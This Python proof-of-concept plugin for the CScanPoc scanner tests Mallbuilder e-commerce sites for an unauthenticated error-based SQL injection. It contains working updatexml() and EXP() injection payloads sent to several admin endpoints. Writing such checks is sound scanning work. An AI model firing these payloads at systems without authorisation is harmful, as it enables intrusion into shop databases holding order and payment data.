# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Mallbuilder_0002' # 平台漏洞编号，留空
    name = 'Mallbuilder商城系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-15'  # 漏洞公布时间
    desc = '''
        Mallbuilder商城系统，无需登录，参数过滤不完整，报错注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Mallbuilder商城系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '70262400-33a3-423e-af1c-f5ac46a4c1ba'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer  http://www.wooyun.org/bugs/wooyun-2015-0120156
            #http://www.wooyun.org/bugs/wooyun-2015-0120160
            #http://www.wooyun.org/bugs/wooyun-2015-0120578
            #http://www.wooyun.org/bugs/wooyun-2015-0120581
            #http://www.wooyun.org/bugs/wooyun-2015-0120607
            hh = hackhttp.hackhttp()
            payloads = [
                '?m=message&s=admin_message_list_delbox&rid=1%20and%20EXP(~(select%20*%20from%20(select%20md5(3.14))a))',
                '?m=product&s=admin/order_detail&oid=updatexml(1,concat(0x5c,md5(3.14)),1)'
            ]
            for payload in payloads:
                url = self.target + payload
                code, head, res, errcode, finalurl =  hh.http(url)
                if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
                    #security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

                    
            data = 'action=a&result=1&id=1%20or%20updatexml(1,concat(0x5c,md5(3.14)),1)'
            path = '?m=payment&s=admin/bank_account_mod'
            url = self.target + path
            code, head, res, errcode, finalurl =  hh.http(url,data)
            if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

                
            data = 'result=50&id=updatexml(1,concat(0x5c,md5(3.14)),1)&act=edit'
            path = '?m=payment&s=admin/withdraw&operation=edit'
            url = self.target + path
            code, head, res, errcode, finalurl =  hh.http(url,data)
            if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))


            data = 'action=111&id=updatexml(1,concat(0x5c,md5(3.14)),1)'
            path = '?m=product&s=admin/cpmod'
            url = self.target + path
            code, head, res, errcode, finalurl =  hh.http(url,data)
            if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))


        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
